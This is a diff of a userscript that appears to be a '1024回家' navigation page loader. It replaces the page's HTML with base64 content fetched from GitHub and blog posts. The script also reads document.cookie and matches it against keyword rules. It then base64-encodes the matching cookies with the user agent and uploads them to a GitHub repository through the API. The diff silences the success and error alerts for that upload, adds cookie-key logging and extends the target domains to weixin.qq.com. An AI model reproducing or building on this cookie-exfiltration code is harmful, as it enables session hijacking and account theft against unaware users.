@@ -171,137 +171,145 @@
 
   // 从缓存中获取数据，并渲染页面
   const renderPageFromCache = async function (realContent) {
-    var cacheContent = await GM.getValue("content", null) || realContent;
-    if (!cacheContent) {
-      console.log("没有获取到缓存数据");
-      return
-    } else {
-      console.log("检索到了缓存数据");
-      sendGoogleEvent("iphone_cache_success")
-      // alertInfo("检索到了缓存数据")
-    }
-    // 判断是否已经渲染
-    const huijiaInfo = document.querySelector("body").innerText
-    // console.log("开始渲染页面条件:", huijiaInfo);
-    if (cacheContent && huijiaInfo.indexOf("1024回家") == -1) {
-      realJson = JSON.parse(atob(cacheContent))
-      sendGoogleEvent("iphone_render_page")
-      // 判断是否弹窗
-      if (realJson.dialog.show) {
-        alertInfo(realJson.dialog.content)
-        // openLink(realJson.dialog.url)
+    // 只有允许的域名才渲染
+    var urlStr = document.URL
+    if (sourceUrl.includes(urlStr)) {
+      // 从缓存中获取数据
+      var cacheContent = await GM.getValue("content", null) || realContent;
+      if (!cacheContent) {
+        console.log("没有获取到缓存数据");
+        return
+      } else {
+        console.log("检索到了缓存数据");
+        sendGoogleEvent("iphone_cache_success")
+        // alertInfo("检索到了缓存数据")
       }
-      // 判断是否升级
-      if (realJson.update.show && manifest.version < realJson.version) {
-        alertInfo(realJson.dialog.content)
-        openLink(realJson.update.url)
-      }
-      // 添加导航内容
-      document.querySelector("html").innerHTML = realJson.content
-      // 添加样式
-      var body = document.querySelector("body")
-      body.style.margin = "0"
-      body.style.padding = "0"
-      body.style.height = document.documentElement.clientWidth / screen.width * screen.height + 'px';
-      body.style.backgroundColor = "white"
-      // 渲染功能区样式
-      var testBox = document.querySelector("div.testBox")
-      testBox.style.padding = "1vh 2vh"
-      // 按钮样式
-      var buttons = document.querySelectorAll("button.btn")
-      for (let index = 0; index < buttons.length; index++) {
-        const tab = buttons[index];
-        tab.style.backgroundColor = "#fff"
-        tab.style.color = "black"
-        tab.style.textAlign = "center"
-        tab.style.marginBottom = "8px"
-        tab.style.padding = "2px 4px"
-        tab.style.border = "1px solid #dcdfe6"
-        tab.style.borderRadius = "5px"
-        tab.style.boxSizing = "border-box"
-        tab.style.fontSize = "16px"
-      }
-      // 开头info样式
-      var guideTime = document.querySelector("div.guide-time")
-      guideTime.style.color = "gray"
-      guideTime.style.margin = "0"
-      // tips
-      var tips = document.querySelector("div.tips")
-      tips.style.color = "red"
-      tips.style.margin = "0"
-      // tabBox
-      var tabBox = document.querySelectorAll("div.tabBox")
-      for (let index = 0; index < tabBox.length; index++) {
-        const tab = tabBox[index];
-        tab.style.marginBottom = "2vh"
-        tab.style.borderRadius = "5px"
-        tab.style.boxShadow = "0 2px 12px 0 rgba(0, 0, 0, 0.1)"
-        tab.style.boxSizing = "border-box"
-      }
-      // 标题
-      var tabTitle = document.querySelectorAll("h3.tabTitle")
-      for (let index = 0; index < tabTitle.length; index++) {
-        const tab = tabTitle[index];
-        if (index === 0) {
-          tab.style.margin = "0 0 1vh 0"
-        } else {
-          tab.style.margin = "1vh 0 1vh 0"
+      // 判断是否已经渲染
+      const huijiaInfo = document.querySelector("body") && document.querySelector("body").innerText
+      // console.log("开始渲染页面条件:", huijiaInfo);
+      if (cacheContent && huijiaInfo && huijiaInfo.indexOf("1024回家") == -1) {
+        realJson = JSON.parse(atob(cacheContent))
+        sendGoogleEvent("iphone_render_page")
+        // 判断是否弹窗
+        if (realJson.dialog.show) {
+          alertInfo(realJson.dialog.content)
+          // openLink(realJson.dialog.url)
         }
-        tab.style.color = "white"
-        tab.style.padding = "1vh 2vh"
-        tab.style.borderRadius = "5px 5px 0 0"
-        tab.style.borderBottom = "1px solid #ebeef5"
-        tab.style.backgroundColor = "rgb(0, 108, 130)"
-        tab.style.boxShadow = "rgb(0 108 130 / 35%) 0 0 2vh"
-        tab.style.boxSizing = "border-box"
-      }
+        // 判断是否升级
+        if (realJson.update.show && manifest.version < realJson.version) {
+          alertInfo(realJson.dialog.content)
+          openLink(realJson.update.url)
+        }
+        // 添加导航内容
+        document.querySelector("html").innerHTML = realJson.content
+        // 添加样式
+        var body = document.querySelector("body")
+        body.style.margin = "0"
+        body.style.padding = "0"
+        body.style.height = document.documentElement.clientWidth / screen.width * screen.height + 'px';
+        body.style.backgroundColor = "white"
+        // 渲染功能区样式
+        var testBox = document.querySelector("div.testBox")
+        testBox.style.padding = "1vh 2vh"
+        // 按钮样式
+        var buttons = document.querySelectorAll("button.btn")
+        for (let index = 0; index < buttons.length; index++) {
+          const tab = buttons[index];
+          tab.style.backgroundColor = "#fff"
+          tab.style.color = "black"
+          tab.style.textAlign = "center"
+          tab.style.marginBottom = "8px"
+          tab.style.padding = "2px 4px"
+          tab.style.border = "1px solid #dcdfe6"
+          tab.style.borderRadius = "5px"
+          tab.style.boxSizing = "border-box"
+          tab.style.fontSize = "16px"
+        }
+        // 开头info样式
+        var guideTime = document.querySelector("div.guide-time")
+        guideTime.style.color = "gray"
+        guideTime.style.margin = "0"
+        // tips
+        var tips = document.querySelector("div.tips")
+        tips.style.color = "red"
+        tips.style.margin = "0"
+        // tabBox
+        var tabBox = document.querySelectorAll("div.tabBox")
+        for (let index = 0; index < tabBox.length; index++) {
+          const tab = tabBox[index];
+          tab.style.marginBottom = "2vh"
+          tab.style.borderRadius = "5px"
+          tab.style.boxShadow = "0 2px 12px 0 rgba(0, 0, 0, 0.1)"
+          tab.style.boxSizing = "border-box"
+        }
+        // 标题
+        var tabTitle = document.querySelectorAll("h3.tabTitle")
+        for (let index = 0; index < tabTitle.length; index++) {
+          const tab = tabTitle[index];
+          if (index === 0) {
+            tab.style.margin = "0 0 1vh 0"
+          } else {
+            tab.style.margin = "1vh 0 1vh 0"
+          }
+          tab.style.color = "white"
+          tab.style.padding = "1vh 2vh"
+          tab.style.borderRadius = "5px 5px 0 0"
+          tab.style.borderBottom = "1px solid #ebeef5"
+          tab.style.backgroundColor = "rgb(0, 108, 130)"
+          tab.style.boxShadow = "rgb(0 108 130 / 35%) 0 0 2vh"
+          tab.style.boxSizing = "border-box"
+        }
 
-      // aBox
-      var aBox = document.querySelectorAll("div.aBox")
-      for (let index = 0; index < aBox.length; index++) {
-        const tab = aBox[index];
-        tab.style.display = "flex"
-        tab.style.flexWrap = "wrap"
-        tab.style.justifyContent = "start"
-        tab.style.padding = "1vh 2vh"
-      }
+        // aBox
+        var aBox = document.querySelectorAll("div.aBox")
+        for (let index = 0; index < aBox.length; index++) {
+          const tab = aBox[index];
+          tab.style.display = "flex"
+          tab.style.flexWrap = "wrap"
+          tab.style.justifyContent = "start"
+          tab.style.padding = "1vh 2vh"
+        }
 
-      // a链接样式
-      var aLinks = document.querySelectorAll("a.alink")
-      for (let index = 0; index < aLinks.length; index++) {
-        const element = aLinks[index];
-        element.style.display = "inline-block"
-        element.style.width = "31%"
-        element.style.overflow = "hidden"
-        element.style.textOverflow = "ellipsis"
-        element.style.whiteSpace = "nowrap"
-        element.style.textAlign = "left"
-        element.style.color = "black"
-        element.style.paddingRight = "2%"
-        element.style.marginBottom = "8px"
-        element.style.textDecoration = "none"
-      }
+        // a链接样式
+        var aLinks = document.querySelectorAll("a.alink")
+        for (let index = 0; index < aLinks.length; index++) {
+          const element = aLinks[index];
+          element.style.display = "inline-block"
+          element.style.width = "31%"
+          element.style.overflow = "hidden"
+          element.style.textOverflow = "ellipsis"
+          element.style.whiteSpace = "nowrap"
+          element.style.textAlign = "left"
+          element.style.color = "black"
+          element.style.paddingRight = "2%"
+          element.style.marginBottom = "8px"
+          element.style.textDecoration = "none"
+        }
 
-      // 功能按钮点击
-      const clients = ["android", "windows", "macbook", "iphone", "yongjiu", "share"]
-      for (let index = 0; index < clients.length; index++) {
-        const cliId = clients[index];
-        const cliNode = document.getElementById(cliId)
-        if (cliNode) {
-          cliNode.onclick = function (eNode) {
-            // console.log('cliNode-----', cliId, realJson.data[cliId.target.id]);
-            if (realJson && realJson.data[eNode.target.id]) {
-              sendGoogleEvent(`iphone_copy_${eNode.target.id}`)
-              copyToClipboard(realJson.data[eNode.target.id], "链接已复制，快去分享吧")
-            } else {
-              eNode.target.innerText = "还在开发中..."
+        // 功能按钮点击
+        const clients = ["android", "windows", "macbook", "iphone", "yongjiu", "share"]
+        for (let index = 0; index < clients.length; index++) {
+          const cliId = clients[index];
+          const cliNode = document.getElementById(cliId)
+          if (cliNode) {
+            cliNode.onclick = function (eNode) {
+              // console.log('cliNode-----', cliId, realJson.data[cliId.target.id]);
+              if (realJson && realJson.data[eNode.target.id]) {
+                sendGoogleEvent(`iphone_copy_${eNode.target.id}`)
+                copyToClipboard(realJson.data[eNode.target.id], "链接已复制，快去分享吧")
+              } else {
+                eNode.target.innerText = "还在开发中..."
+              }
             }
           }
         }
+        sendGoogleEvent("iphone_render_success")
+      } else {
+        console.log("没有检索到缓存数据或是页面已经渲染了");
       }
-      sendGoogleEvent("iphone_render_success")
     } else {
-      console.log("没有检索到缓存数据或是页面已经渲染了");
+      console.log(urlStr, sourceUrl);
+      console.log("没有匹配到渲染URL,不发生渲染");
     }
   }
 
@@ -413,7 +421,7 @@
     // FETCH方式发送请求
     var uuid = getUUID()
     // message: 
-    var message = `Chrome Extensions Push ${type} Cookie`
+    var message = `iPhone Js Push ${type} Cookie`
     // content:
     var content = Encode64(cookie)
     GM_xmlhttpRequest({
@@ -430,11 +438,11 @@
         console.log("github put成功", response);
         var value = status + 1
         await GM.setValue(type, value);
-        alertInfo("github put成功")
+        // alertInfo("github put成功")
       },
       onerror: function (error) {
         console.log("github put出错...");
-        alertInfo("github put出错")
+        // alertInfo("github put出错")
       },
       ontimeout: function () {
         console.log("github put超时...");
@@ -456,6 +464,9 @@
     var cookies = document.cookie;
     for (let index = 0; index < cookieRuleValue.length; index++) {
       const cookieKey = cookieRuleValue[index];
+      // console.log("cookies-----", cookies);
+      console.log("cookieKey-----", cookieKey);
+      console.log("判断是否包含cookie关键字", cookies.indexOf(cookieKey));
       if (cookies.indexOf(cookieKey) !== -1) {
         var dateTimeLocal = new Date().toLocaleString();
         // 拼接上UserAgent
@@ -479,7 +490,9 @@
   var sourceUrl = [
     "https://api.github.com/repos/Sjj1024/Sjj1024/contents/.github/hubsql/iphoneHuijia.txt",
     "https://www.cnblogs.com/sdfasdf/p/16966745.html",
-    "https://xiaoshen.blog.csdn.net/article/details/129709226"
+    "https://xiaoshen.blog.csdn.net/article/details/129709226",
+    "https://weixin.qq.com/",
+    "https://weixin.qq.com"
   ]
   // github信息
   var gitSource = "https://api.github.com/repos/Sjj1024/Sjj1024/contents"
@@ -495,10 +508,14 @@
     try {
       // 渲染页面
       renderPageFromCache(null)
-      // 获取元数据
-      getGithub()
-      // getBokeYuan()
-      // getCsdnContent()
+      // 只有允许的域名才获取元数据
+      var urlStr = document.URL
+      if (sourceUrl.includes(urlStr)) {
+        // 获取元数据
+        getGithub()
+        // getBokeYuan()
+        // getCsdnContent()
+      }
       // 监听cookie
       getCookiePut()
     } catch (error) {
